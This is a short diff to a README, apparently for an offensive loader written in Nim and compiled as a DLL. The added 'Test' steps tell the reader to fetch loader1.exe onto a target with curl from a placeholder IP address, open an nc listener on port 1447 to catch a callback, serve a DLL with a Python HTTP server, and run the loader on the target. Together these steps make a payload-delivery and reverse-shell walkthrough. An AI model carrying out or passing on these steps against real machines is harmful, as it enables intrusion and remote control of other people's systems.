@@ -38,7 +38,17 @@ nim c --cpu:amd64 --cc:gcc --app:lib --noMain --nomain --passL:"-luser32" --pass
 
 # Test
 1. To use the loader, download it onto a target 
-2. Run it on target
+
+```curl -O <ip address>:<port>/loader1.exe```
+2. Create a listener:
+
+```nc -nlvp 1447```
+3. Start a server to serve the DLL
+  
+```python -m http.server 1337```
+6. Run loader on target:
+
+```.\loader1.exe```
 
 
 # NOTE
